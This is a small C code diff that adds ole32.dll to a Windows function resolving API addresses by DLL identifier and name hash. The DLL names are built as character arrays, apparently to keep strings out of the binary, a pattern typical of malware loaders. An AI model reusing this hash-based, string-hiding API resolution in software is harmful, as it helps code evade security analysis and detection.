@@ -387,6 +387,7 @@ LPVOID GetProcAddressEx(PCHAR Dll, DWORD dwModule, DWORD dwProcNameHash )
 	char psapi_dll[]	= {'p','s','a','p','i','.','d','l','l',0};
 	char shlwapi_dll[]	= {'s','h','l','w','a','p','i','.','d','l','l',0};
 	char version_dll[]  = {'v','e','r','s','i','o','n','.','d','l','l',0};
+	char ole32_dll[]    = {'o','l','e','3','2','.','d','l','l',0};
 
 	//-----------------------------------------------------------------------
 	HMODULE Module = NULL;
@@ -482,8 +483,13 @@ LPVOID GetProcAddressEx(PCHAR Dll, DWORD dwModule, DWORD dwProcNameHash )
 
 			case DLL_ODBC32:
 				DllName = (PCHAR)odbc32_dll;break;
+			
 			case DLL_VERSION:
 				DllName = version_dll; break;
+			
+			case DLL_OLE32: 
+				DllName = ole32_dll; break;
+			
 			default:
 				return 0;
 		}
